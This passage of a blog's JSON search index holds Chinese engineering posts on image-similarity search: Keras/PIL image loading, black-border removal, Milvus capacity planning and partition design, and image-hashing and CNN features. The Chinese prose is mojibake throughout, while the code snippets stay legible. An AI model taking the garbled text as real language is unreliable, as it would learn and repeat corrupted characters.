","date":"2020-04-11","objectID":"/image-search-system2/:1:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"1ã€å½’ä¸€åŒ– ä¸ºäº†æ–¹ä¾¿åç»­æ“ä½œï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šå°† feature è¿›è¡Œå½’ä¸€åŒ–çš„å¤„ç†ï¼š from numpy import linalg as LA norm_feat = feat[0]/LA.norm(feat[0]) åç»­å®é™…ä½¿ç”¨çš„ä¹Ÿæ˜¯å½’ä¸€åŒ–åçš„ norm_feat ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:1:1","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"2ã€Image è¯´æ˜ è¿™é‡ŒåŠ è½½å›¾åƒä½¿ç”¨çš„æ˜¯ keras.preprocessing çš„ image.load_img æ–¹æ³•å³ï¼š from keras.preprocessing import image img_path = 'elephant.jpg' img = image.load_img(img_path, target_size=(224, 224)) å®é™…ä¸Šæ˜¯ Keras è°ƒç”¨çš„ TensorFlow çš„æ–¹æ³•ï¼Œè¯¦æƒ…è§ TensorFlow å®˜æ–¹æ–‡æ¡£ ï¼Œè€Œæœ€åå¾—åˆ°çš„ image å¯¹è±¡å…¶å®æ˜¯ä¸€ä¸ª PIL Image å®ä¾‹ï¼ˆ TensorFlow ä½¿ç”¨çš„ PIL ï¼‰ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:1:2","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"3ã€Bytes è½¬æ¢ å®é™…å·¥ç¨‹ä¸­å›¾åƒå†…å®¹å¸¸å¸¸æ˜¯é€šè¿‡ç½‘ç»œè¿›è¡Œä¼ è¾“çš„ï¼Œå› æ­¤ç›¸æ¯”äºä» path è·¯å¾„åŠ è½½å›¾ç‰‡ï¼Œæˆ‘ä»¬æ›´å¸Œæœ›ç›´æ¥å°† bytes æ•°æ®è½¬æ¢ä¸º image å¯¹è±¡å³ PIL Image ï¼š import io from PIL import Image # img_bytes: å›¾ç‰‡å†…å®¹ bytes img = Image.open(io.BytesIO(img_bytes)) img = img.convert('RGB') img = img.resize((224, 224), Image.NEAREST) ä»¥ä¸Š img ä¸å‰æ–‡ä¸­çš„ image.load_img å¾—åˆ°çš„ç»“æœç›¸åŒï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼š å¿…é¡»è¿›è¡Œ RGB è½¬æ¢ å¿…é¡»è¿›è¡Œ resize ï¼ˆ load_img æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå°±æ˜¯ resize ï¼‰ ","date":"2020-04-11","objectID":"/image-search-system2/:1:3","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"4ã€é»‘è¾¹å¤„ç† æœ‰æ—¶å€™å›¾åƒä¼šæœ‰æ¯”è¾ƒå¤šçš„é»‘è¾¹éƒ¨åˆ†ï¼ˆä¾‹å¦‚æˆªå±ï¼‰ï¼Œè€Œè¿™äº›é»‘è¾¹çš„éƒ¨åˆ†å³æ²¡æœ‰å®é™…ä»·å€¼ï¼Œåˆä¼šäº§ç”Ÿæ¯”è¾ƒå¤§çš„å¹²æ‰°ï¼Œå› æ­¤å»é™¤é»‘è¾¹ä¹Ÿæ˜¯ä¸€é¡¹å¸¸è§çš„æ“ä½œã€‚ æ‰€è°“é»‘è¾¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€è¡Œæˆ–ä¸€åˆ—çš„åƒç´ ç‚¹å…¨éƒ¨éƒ½æ˜¯ (0, 0, 0) ( RGB å›¾åƒ)ï¼Œå»é™¤é»‘è¾¹å°±æ˜¯æ‰¾åˆ°è¿™äº›è¡Œæˆ–åˆ—ï¼Œç„¶ååˆ é™¤ï¼Œå®é™…æ˜¯ä¸€ä¸ª numpy çš„ 3-D Matrix æ“ä½œã€‚ ç§»é™¤æ¨ªå‘é»‘è¾¹ç¤ºä¾‹ï¼š # -*- coding: utf-8 -*- import numpy as np from keras.preprocessing import image def RemoveBlackEdge(img): \"\"\"ç§»é™¤å›¾ç‰‡æ¨ªå‘é»‘è¾¹ Args: img: PIL image å®ä¾‹ Returns: PIL image å®ä¾‹ \"\"\" width = img.width img = image.img_to_array(img) img_without_black = img[~np.all(img == np.zeros((1, width, 3), np.uint8), axis=(1, 2))] img = image.array_to_img(img_without_black) return img CNN æå–å›¾åƒç‰¹å¾ä»¥åŠå›¾åƒçš„å…¶å®ƒç›¸å…³å¤„ç†å…ˆå†™è¿™ä¹ˆå¤šï¼Œæˆ‘ä»¬å†çœ‹å‘é‡æœç´¢å¼•æ“ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:1:4","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"å‘é‡æœç´¢å¼•æ“ Milvus åªæœ‰å›¾åƒçš„ç‰¹å¾å‘é‡æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹è¿™äº›ç‰¹å¾å‘é‡è¿›è¡ŒåŠ¨æ€çš„ç®¡ç†ï¼ˆå¢åˆ æ”¹ï¼‰ï¼Œä»¥åŠè®¡ç®—å‘é‡çš„ç›¸ä¼¼åº¦å¹¶è¿”å›æœ€é‚»è¿‘èŒƒå›´å†…çš„å‘é‡æ•°æ®ï¼Œè€Œå¼€æºçš„å‘é‡æœç´¢å¼•æ“ Milvus åˆ™å¾ˆå¥½çš„å®Œæˆè¿™äº›å·¥ä½œã€‚ ä¸‹æ–‡å°†ä¼šè®²è¿°å…·ä½“çš„å®è·µï¼Œä»¥åŠè¦æ³¨æ„çš„åœ°æ–¹ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:2:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"1ã€å¯¹ CPU æœ‰è¦æ±‚ æƒ³è¦ä½¿ç”¨ Milvus ï¼Œé¦–å…ˆå¿…é¡»è¦æ±‚ä½ çš„ CPU æ”¯æŒ avx2 æŒ‡ä»¤é›†ï¼Œå¦‚ä½•æŸ¥çœ‹ä½ çš„ CPU æ”¯æŒå“ªäº›æŒ‡ä»¤é›†å‘¢ï¼Ÿå¯¹äº Linux ç³»ç»Ÿï¼Œè¾“å…¥æŒ‡ä»¤ cat /proc/cpuinfo | grep flags ä½ å°†ä¼šçœ‹åˆ°å½¢å¦‚ä»¥ä¸‹çš„å†…å®¹ï¼š flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid dca sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm cpuid_fault epb invpcid_single pti intel_ppin tpr_shadow vnmi flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid cqm xsaveopt cqm_llc cqm_occup_llc dtherm ida arat pln pts flags åé¢çš„è¿™ä¸€å¤§å †å°±æ˜¯ä½ çš„ CPU æ”¯æŒçš„å…¨éƒ¨æŒ‡ä»¤é›†ï¼Œå½“ç„¶å†…å®¹å¤ªå¤šäº†ï¼Œæˆ‘åªæƒ³çœ‹æ˜¯å¦æ”¯æŒå…·ä½“çš„æŸä¸ªæŒ‡ä»¤é›†ï¼Œæ¯”å¦‚ avx2 ï¼Œ å†åŠ ä¸€ä¸ª grep è¿‡æ»¤ä¸€ä¸‹å³å¯ï¼š cat /proc/cpuinfo | grep flags | grep avx2 å¦‚æœæ‰§è¡Œç»“æœæ²¡æœ‰å†…å®¹è¾“å‡ºï¼Œå°±æ˜¯ä¸æ”¯æŒè¿™ä¸ªæŒ‡ä»¤é›†ï¼Œä½ åªèƒ½æ¢ä¸€å°æ»¡è¶³è¦æ±‚çš„æœºå™¨ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:2:1","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"2ã€å®¹é‡è§„åˆ’ ç³»ç»Ÿè®¾è®¡æ—¶ï¼Œå®¹é‡è§„åˆ’æ˜¯éœ€è¦é¦–å…ˆè€ƒè™‘çš„åœ°æ–¹ï¼Œæˆ‘ä»¬éœ€è¦å­˜å‚¨å¤šå°‘æ•°æ®ï¼Œè¿™äº›æ•°æ®éœ€è¦å¤šå°‘å†…å­˜ä»¥åŠå¤šå¤§çš„ç£ç›˜ç©ºé—´ï¼Ÿ é€Ÿç®—ï¼Œä¸Šæ–‡ä¸­ç‰¹å¾å‘é‡çš„æ¯ä¸€ä¸ªç»´åº¦éƒ½æ˜¯ float32 çš„æ•°æ®ç±»å‹ï¼Œä¸€ä¸ª float32 éœ€è¦å ç”¨ 4 byteï¼Œé‚£ä¹ˆä¸€ä¸ª 512 ç»´çš„å‘é‡å°±éœ€è¦ 2 KB ï¼Œä¾æ¬¡ç±»æ¨ï¼š ä¸€åƒä¸ª 512 ç»´å‘é‡éœ€è¦ 2 MB ä¸€ç™¾ä¸‡ 512 ç»´å‘é‡éœ€è¦ 2 GB ä¸€åƒä¸‡ 512 ç»´å‘é‡éœ€è¦ 20 GB ä¸€ä¸ªäº¿ 512 ç»´å‘é‡éœ€è¦ 200 GB åä¸ªäº¿ 512 ç»´å‘é‡éœ€è¦ 2 TB å¦‚æœæˆ‘ä»¬å¸Œæœ›èƒ½å°†æ•°æ®å…¨éƒ¨å­˜åœ¨å†…å­˜ä¸­ï¼Œé‚£ä¹ˆç³»ç»Ÿå°±è‡³å°‘éœ€è¦å¯¹åº”å¤§å°çš„å†…å­˜å®¹é‡ã€‚ è¿™é‡Œæ¨èä½ ä½¿ç”¨å®˜æ–¹çš„å¤§å°è®¡ç®—å·¥å…·: milvus tools å®é™…ä¸Šæˆ‘ä»¬çš„å†…å­˜å¯èƒ½å¹¶æ²¡æœ‰é‚£ä¹ˆå¤§ï¼ˆå†…å­˜ä¸å¤Ÿæ²¡å…³ç³»ï¼Œmilvus ä¼šå°†æ•°æ®è‡ªåŠ¨åˆ·å†™åˆ°ç£ç›˜ä¸Šï¼‰ï¼Œå¦å¤–é™¤äº†è¿™äº›åŸå§‹çš„å‘é‡æ•°æ®ä¹‹å¤–ï¼Œè¿˜ä¼šæœ‰ä¸€äº›å…¶ä»–çš„æ•°æ®ä¾‹å¦‚æ—¥å¿—ç­‰çš„å­˜å‚¨ä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„åœ°æ–¹ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:2:2","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"3ã€ç³»ç»Ÿé…ç½® å…³äºç³»ç»Ÿé…ç½®ï¼Œå®˜æ–¹æ–‡æ¡£æœ‰æ¯”è¾ƒè¯¦ç»†çš„è¯´æ˜ï¼š Milvus æœåŠ¡ç«¯é…ç½® å¦‚ä½•è®¾ç½®ç³»ç»Ÿé…ç½®é¡¹ é…ç½® Milvus ç”¨äºç”Ÿäº§ç¯å¢ƒ ","date":"2020-04-11","objectID":"/image-search-system2/:2:3","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"4ã€æ•°æ®åº“è®¾è®¡ collection \u0026 partition åœ¨ Milvus ä¸­ï¼Œæ•°æ®ä¼šæŒ‰ç…§ collection å’Œ partition è¿›è¡Œåˆ’åˆ†ï¼š collection å°±æ˜¯æˆ‘ä»¬ç†è§£çš„è¡¨ã€‚ partition åˆ™æ˜¯ collection çš„åˆ†åŒºï¼Œä¹Ÿå°±æ˜¯æŸä¸ªè¡¨å†…éƒ¨çš„åˆ†åŒºã€‚ partition åˆ†åŒºåœ¨åº•å±‚å®ç°ä¸Šå…¶å®ä¸ collection é›†åˆæ˜¯ä¸€è‡´çš„ï¼Œåªæ˜¯å‰è€…ä»å±äºåè€…ï¼Œä½†æ˜¯æœ‰äº†åˆ†åŒºä¹‹åï¼Œæ•°æ®çš„ç»„ç»‡æ–¹å¼å˜å¾—æ›´åŠ çµæ´»ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æŒ‡å®šé›†åˆä¸­æŸä¸ªç‰¹å®šåˆ†åŒºè¿›è¡ŒæŸ¥è¯¢ï¼Œä»è€Œè¾¾åˆ°ä¸€ä¸ªæ›´é«˜çš„æŸ¥è¯¢æ€§èƒ½ï¼Œæ›´å¤šå†…å®¹å‚è€ƒ åˆ†åŒºè¡¨è¯¦ç»†è¯´æ˜ ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šå°‘ä¸ª collection å’Œ partition ï¼Ÿ ç”±äº collection å’Œ partition çš„åŸºæœ¬ä¿¡æ¯éƒ½å±äºå…ƒæ•°æ®ï¼Œè€Œ milvus å†…éƒ¨è¿›è¡Œå…ƒæ•°æ®ç®¡ç†éœ€è¦ä½¿ç”¨ SQLiteï¼ˆ milvus å†…éƒ¨é›†æˆï¼‰æˆ–è€… MySQL (éœ€è¦å¤–éƒ¨è¿æ¥) å…¶ä¸­ä¹‹ä¸€ï¼Œå¦‚æœä½ ä½¿ç”¨é»˜è®¤çš„ SQLite å»ç®¡ç†å…ƒæ•°æ®çš„è¯ï¼Œå½“é›†åˆå’Œåˆ†åŒºçš„æ•°é‡è¿‡å¤šæ—¶ï¼Œæ€§èƒ½æŸè€—ä¼šå¾ˆä¸¥é‡ï¼Œå› æ­¤é›†åˆå’Œåˆ†åŒºæ€»æ•°ä¸è¦è¶…è¿‡ 50000 ( 0.8.0 ç‰ˆæœ¬å°†ä¼šé™åˆ¶ä¸º 4096 ) ï¼Œéœ€è¦è®¾ç½®æ›´å¤šçš„æ•°é‡åˆ™å»ºè®®ä½¿ç”¨å¤–æ¥ MySQL çš„æ–¹å¼ã€‚ Milvus çš„ collection å’Œ partition å†…éƒ¨æ”¯æŒçš„æ•°æ®ç»“æ„éå¸¸ç®€å•ï¼Œåªæ”¯æŒ ID + vector ï¼Œæ¢å¥è¯è¯´ï¼Œè¡¨åªæœ‰ä¸¤åˆ—ï¼Œä¸€åˆ—æ˜¯ ID ï¼Œä¸€åˆ—æ˜¯å‘é‡æ•°æ®ã€‚ æ³¨æ„ï¼š ID ç›®å‰åªæ”¯æŒæ•´æ•°ç±»å‹ æˆ‘ä»¬éœ€è¦ä¿è¯ ID åœ¨ collection çš„å±‚é¢æ˜¯å”¯ä¸€çš„ï¼Œè€Œä¸æ˜¯ partition ã€‚ æ¡ä»¶è¿‡æ»¤ æˆ‘ä»¬ä½¿ç”¨ä¸€äº›ä¼ ç»Ÿçš„æ•°æ®åº“æ—¶ï¼Œå¾€å¾€å¯ä»¥æŒ‡å®šå­—æ®µè¿›è¡Œæ¡ä»¶è¿‡æ»¤ï¼Œä½†æ˜¯ Milvus å¹¶ä¸èƒ½ç›´æ¥æ”¯æŒè¿™é¡¹åŠŸèƒ½ï¼Œç„¶è€Œæˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡é›†åˆå’Œåˆ†åŒºçš„è®¾è®¡å»å®ç°ç®€å•çš„æ¡ä»¶è¿‡æ»¤ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬æœ‰å¾ˆå¤šå›¾ç‰‡æ•°æ®ï¼Œä½†æ˜¯è¿™äº›å›¾ç‰‡æ•°æ®éƒ½æ˜ç¡®çš„å±äºå…·ä½“çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§ç”¨æˆ·å»åˆ’åˆ† partition ï¼Œè¿™æ ·æŸ¥è¯¢çš„æ—¶å€™ä»¥ç”¨æˆ·ä½œä¸ºè¿‡æ»¤æ¡ä»¶å…¶å®å°±æ˜¯æŒ‡å®š partition å³å¯ã€‚ ç»“æ„åŒ–æ•°æ®ä¸å‘é‡çš„æ˜ å°„ ç”±äº milvus åªæ”¯æŒ ID + vector çš„æ•°æ®ç»“æ„ï¼Œè€Œå®é™…ä¸šåŠ¡ä¸Šæˆ‘ä»¬æœ€ç»ˆéœ€è¦çš„å¾€å¾€æ˜¯å…·æœ‰ä¸šåŠ¡æ„ä¹‰çš„ç»“æ„åŒ–æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ vector å‘é‡æœ€ç»ˆæ‰¾åˆ°ç»“æ„åŒ–æ•°æ®ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡ ID å»ç»´æŠ¤ç»“æ„åŒ–æ•°æ®ä¸å‘é‡ä¹‹é—´çš„æ˜ å°„å…³ç³»: ç»“æ„åŒ–æ•°æ® ID \u003c--\u003e æ˜ å°„è¡¨ \u003c--\u003e Milvus ID ç´¢å¼•ç±»å‹é€‰æ‹© è¯·å‚è€ƒä»¥ä¸‹æ–‡æ¡£: ç´¢å¼•ç±»å‹ å¦‚ä½•é€‰æ‹©ç´¢å¼•ç±»å‹ ","date":"2020-04-11","objectID":"/image-search-system2/:2:4","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"5ã€æœç´¢ç»“æœå¤„ç† Milvus çš„æœç´¢ç»“æœæ˜¯ ID + distance çš„é›†åˆ: ID : collection ä¸­çš„ ID ã€‚ distance : 0 ~ 1 çš„è·ç¦»å€¼ï¼Œè¡¨ç¤ºç›¸ä¼¼æ€§ç¨‹åº¦ï¼Œè¶Šå°è¶Šç›¸ä¼¼ã€‚ è¿‡æ»¤ ID ä¸º -1 çš„æ•°æ® å½“æ•°æ®é›†è¿‡å°‘çš„æ—¶å€™ï¼Œæœç´¢ç»“æœå¯èƒ½ä¼šåŒ…å« ID ä¸º -1 çš„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å»è¿‡æ»¤æ‰ã€‚ ç¿»é¡µ å‘é‡çš„æœç´¢æ¯”è¾ƒç‰¹åˆ«ï¼ŒæŸ¥è¯¢çš„ç»“æœæ˜¯æŒ‰ç…§ç›¸ä¼¼æ€§é¡ºåºï¼Œä»æœ€ç›¸ä¼¼å¼€å§‹å¾€åé€‰å– topK ä¸ªæ•°æ®ï¼ˆ topK éœ€è¦æœç´¢æ—¶ç”±ç”¨æˆ·æŒ‡å®šï¼‰ã€‚ Milvus çš„æœç´¢ä¸æ”¯æŒç¿»é¡µï¼Œå¦‚æœæˆ‘ä»¬å¸Œæœ›åœ¨ä¸šåŠ¡ä¸Šå®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œé‚£ä¹ˆåªèƒ½ç”±æˆ‘ä»¬è‡ªå·±å»å¤„ç†ï¼Œæ¯”å¦‚ï¼Œæˆ‘æƒ³è¦æ¯é¡µ 10 æ¡æ•°æ®ï¼Œåªæ˜¾ç¤ºç¬¬ 3 é¡µçš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å»å– topK = 30 çš„æ•°æ®ï¼Œç„¶ååªè¿”å›æœ€å 10 æ¡ã€‚ ä¸šåŠ¡ä¸Šçš„ç›¸ä¼¼æ€§é˜ˆå€¼ ä¸¤å¼ å›¾ç‰‡çš„ç‰¹å¾å‘é‡çš„è·ç¦» distance èŒƒå›´æ˜¯ 0 ~ 1 ï¼Œæœ‰äº›æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨ä¸šåŠ¡ä¸Šå»åˆ¤å®šä¸¤å¼ å›¾ç‰‡æ˜¯å¦ç›¸ä¼¼ï¼Œè¿™æ—¶å°±éœ€è¦æˆ‘ä»¬è‡ªå·±å»è®¾ç½®ä¸€ä¸ªè·ç¦»çš„é˜ˆå€¼ï¼Œå½“ distance å°äºé˜ˆå€¼æ—¶å°±å¯ä»¥åˆ¤å®šä¸ºç›¸ä¼¼ï¼Œå¤§äºé˜ˆå€¼æ—¶åˆ¤å®šä¸ºä¸ç›¸ä¼¼ï¼Œè¿™ä¸ªä¹Ÿæ˜¯éœ€è¦æ ¹æ®å…·ä½“çš„ä¸šåŠ¡è‡ªå·±å»å¤„ç†ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:2:5","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"ç»“è¯­ æœ¬æ–‡è®²è¿°äº†ä»¥å›¾æœå›¾ç³»ç»Ÿè¿›è¡Œå·¥ç¨‹å®è·µæ—¶æ¯”è¾ƒå¸¸è§çš„å†…å®¹ï¼Œæœ€åå¼ºçƒˆæ¨èä¸€ä¸‹ Milvus ã€‚ ","date":"2020-04-11","objectID":"/image-search-system2/:3:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿå·¥ç¨‹å®è·µ","uri":"/image-search-system2/"},{"categories":["Engineering"],"content":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","date":"2020-03-31","objectID":"/image-search-system/","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Engineering"],"content":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿° ä»¥å›¾æœå›¾æŒ‡çš„æ˜¯æ ¹æ®å›¾åƒå†…å®¹æœç´¢å‡ºç›¸ä¼¼å†…å®¹çš„å›¾åƒã€‚ æ„å»ºä¸€ä¸ªä»¥å›¾æœå›¾ç³»ç»Ÿéœ€è¦è§£å†³ä¸¤ä¸ªæœ€å…³é”®çš„é—®é¢˜ï¼šé¦–å…ˆï¼Œæå–å›¾åƒç‰¹å¾ï¼›å…¶æ¬¡ï¼Œç‰¹å¾æ•°æ®æœç´¢å¼•æ“ï¼Œå³ç‰¹å¾æ•°æ®æ„å»ºæˆæ•°æ®åº“å¹¶æä¾›ç›¸ä¼¼æ€§æœç´¢çš„åŠŸèƒ½ã€‚ ","date":"2020-03-31","objectID":"/image-search-system/:0:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Engineering"],"content":"å›¾åƒç‰¹å¾è¡¨ç¤º ä»‹ç»ä¸‰ç§æ–¹å¼ã€‚ ","date":"2020-03-31","objectID":"/image-search-system/:1:0","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Engineering"],"content":"å›¾åƒå“ˆå¸Œ å›¾åƒé€šè¿‡ä¸€ç³»åˆ—çš„å˜æ¢å’Œå¤„ç†æœ€ç»ˆå¾—åˆ°çš„ä¸€ç»„å“ˆå¸Œå€¼ç§°ä¹‹ä¸ºå›¾åƒçš„å“ˆå¸Œå€¼ï¼Œè€Œä¸­é—´çš„å˜æ¢å’Œå¤„ç†è¿‡ç¨‹åˆ™ç§°ä¹‹ä¸ºå“ˆå¸Œç®—æ³•ã€‚ å›¾åƒçš„å“ˆå¸Œå€¼æ˜¯å¯¹è¿™å¼ å›¾åƒçš„æ•´ä½“æŠ½è±¡è¡¨ç¤ºã€‚ æ¯”å¦‚ Average Hash ç®—æ³•çš„è®¡ç®—è¿‡ç¨‹ï¼š Reduce size : å°†åŸå›¾å‹ç¼©åˆ° 8 x 8 å³ 64 åƒç´ å¤§å°ï¼Œå¿½ç•¥ç»†èŠ‚ã€‚ Reduce color : ç°åº¦å¤„ç†å¾—åˆ° 64 çº§ç°åº¦å›¾åƒã€‚ Average the colors : è®¡ç®— 64 çº§ç°åº¦å‡å€¼ã€‚ Compute the bits : äºŒå€¼åŒ–å¤„ç†ï¼Œå°†æ¯ä¸ªåƒç´ ä¸ä¸Šä¸€æ­¥å‡å€¼æ¯”è¾ƒå¹¶åˆ†åˆ«è®°ä¸º 0 æˆ–è€… 1 ã€‚ Construct the hash : æ ¹æ®ä¸Šä¸€æ­¥ç»“æœçŸ©é˜µæ„æˆä¸€ä¸ª 64 bit æ•´æ•°ï¼Œæ¯”å¦‚æŒ‰ç…§ä»å·¦åˆ°å³ã€ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºã€‚æœ€åå¾—åˆ°çš„å°±æ˜¯å›¾åƒçš„å‡å€¼å“ˆå¸Œå€¼ã€‚ å‚è€ƒï¼šhttp://www.hackerfactor.com/blog/?/archives/432-Looks-Like-It.html å›¾åƒå“ˆå¸Œç®—æ³•æœ‰å¾ˆå¤šç§ï¼ŒåŒ…å«ä½†ä¸é™äº: AverageHash : ä¹Ÿå« Different Hash PHash : Perceptual Hash MarrHildrethHash : Marr-Hildreth Operator Based Hash RadialVarianceHash : Image hash based on Radon transform BlockMeanHash : Image hash based on block mean ColorMomentHash : Image hash based on color moments æˆ‘ä»¬æœ€å¸¸è§å¯èƒ½å°±æ˜¯ PHash ã€‚ å›¾åƒå“ˆå¸Œå¯ä»¥å¯¹æŠ—ä¸€å®šç¨‹åº¦çš„æ°´å°ã€å‹ç¼©ã€å™ªå£°ç­‰å½±å“ï¼Œå³é€šè¿‡å¯¹æ¯”å›¾åƒå“ˆå¸Œå€¼çš„ Hamming distance ï¼ˆæ±‰æ˜è·ç¦»ï¼‰å¯ä»¥åˆ¤æ–­ä¸¤å¹…å›¾åƒçš„å†…å®¹æ˜¯å¦ç›¸ä¼¼ã€‚ å›¾åƒçš„å“ˆå¸Œå€¼æ˜¯å¯¹è¿™å¼ å›¾åƒçš„æ•´ä½“æŠ½è±¡è¡¨ç¤ºï¼Œå±€é™æ€§ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œç”±äºæ˜¯å¯¹å›¾åƒæ•´ä½“è¿›è¡Œçš„å¤„ç†ï¼Œä¸€æ—¦æˆ‘ä»¬å¯¹æ•´ä½“æ€§è¿›è¡Œäº†ç ´åï¼Œæ¯”å¦‚åœ¨åŸå›¾åŠ ä¸€ä¸ªé»‘è¾¹å°±å‡ ä¹æ— æ³•åˆ¤æ–­ç›¸ä¼¼æ€§äº†ã€‚ ","date":"2020-03-31","objectID":"/image-search-system/:1:1","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Engineering"],"content":"ä¼ ç»Ÿç‰¹å¾ åœ¨è®¡ç®—æœºè§†è§‰é¢†åŸŸæ—©æœŸï¼Œåˆ›é€ äº†å¾ˆå¤šç»å…¸çš„æ‰‹å·¥è®¾è®¡çš„ç‰¹å¾ç®—æ³•ï¼Œæ¯”å¦‚ SIFT å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé€šè¿‡ SIFT ç®—æ³•æå–å‡ºæ¥çš„ä¸€ç³»åˆ—çš„ç‰¹å¾ç‚¹ã€‚ ä¸€å¹…å›¾åƒæå–å‡ºæ¥çš„ç‰¹å¾ç‚¹æœ‰å¤šä¸ªï¼Œä¸”æ¯ä¸€ä¸ªç‰¹å¾ç‚¹éƒ½æ˜¯ä¸€ä¸ªå±€éƒ¨å‘é‡ï¼Œä¸ºäº†è¿›è¡Œç›¸ä¼¼æ€§è®¡ç®—ï¼Œé€šå¸¸éœ€è¦å…ˆå°†è¿™ä¸€ç³»åˆ—ç‰¹å¾ç‚¹èåˆç¼–ç ä¸ºä¸€ä¸ªå…¨å±€ç‰¹å¾ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨ç‰¹å¾å‘é‡èåˆç¼–ç ä¸ºä¸€ä¸ªå…¨å±€ç‰¹å¾å‘é‡ï¼ˆç”¨è¿™ä¸ªå…¨å±€ç‰¹å¾å‘é‡è¡¨ç¤ºä¸€å¹…å›¾åƒï¼‰ï¼Œèåˆç¼–ç ç›¸å…³çš„ç®—æ³•åŒ…æ‹¬ä½†ä¸é™äº: BOW Fisher vector VLAD ","date":"2020-03-31","objectID":"/image-search-system/:1:2","tags":["Engineering"],"title":"ä»¥å›¾æœå›¾ç³»ç»Ÿæ¦‚è¿°","uri":"/image-search-system/"},{"categories":["Engineering"],"content":"CNN ç‰¹æ€§ äººå·¥æ™ºèƒ½å…´èµ·ä¹‹åï¼ŒåŸºäº CNN å·ç§¯ç¥ç»ç½‘ç»œæå–å›¾åƒç‰¹å¾è¶Šæ¥è¶Šä¸»æµã€‚ é€šè¿‡ CNN æå–å‡ºæ¥çš„å›¾åƒç‰¹å¾å…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªå¤šç»´å‘é‡ï¼Œæ¯”å¦‚ä½¿ç”¨ VGG16 æ¨¡å‹æå–ç‰¹å¾å¯å‚è€ƒ: https://keras.io/applications/#extract-features-with-vgg16 